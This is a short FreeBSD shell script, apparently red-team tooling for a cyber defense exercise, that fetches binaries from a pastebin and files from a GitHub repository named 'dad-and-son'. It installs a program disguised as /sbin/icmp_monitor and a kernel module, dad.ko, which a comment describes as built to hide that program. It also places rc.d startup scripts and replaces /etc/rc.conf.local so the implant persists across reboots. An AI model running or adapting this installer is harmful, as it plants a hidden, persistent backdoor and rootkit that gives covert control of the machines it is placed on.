#!/bin/sh

#pkg install -y vim-console

cd /tmp

#if [[]]
#then
	# we're running a weird build of son that lets me set the interface
#	fetch http://paste.c-net.org/SeasonsJennings
#	mv SeasonsJennings son_debug

#	# and a build of dad intended to hide icmp_monitor
#	fetch http://paste.c-net.org/HallwayZephyr
#	mv HallwayZephyr dad.ko
#else
	fetch http://paste.c-net.org/KippieBlank
	mv KippieBlank son_debug
	fetch http://paste.c-net.org/TigerBalraj
	mv TigerBalraj dad.ko
#fi

fetch https://raw.githubusercontent.com/FlamingSpork/dad-and-son/rpg-cdt/icmp_monitor.rc
fetch https://raw.githubusercontent.com/FlamingSpork/dad-and-son/rpg-cdt/icmp_launch.sh
fetch https://raw.githubusercontent.com/FlamingSpork/dad-and-son/rpg-cdt/rc.conf.local

chmod +x son_debug
chmod +x icmp_monitor.rc
chmod +x icmp_launch.sh

mv son_debug /sbin/icmp_monitor
mv dad.ko /boot/kernel/dad.ko
mv icmp_monitor.rc /usr/local/etc/rc.d/icmp_monitor
mv icmp_launch.sh /usr/local/etc/rc.d/icmp_launch.sh
mv rc.conf.local /etc/rc.conf.local
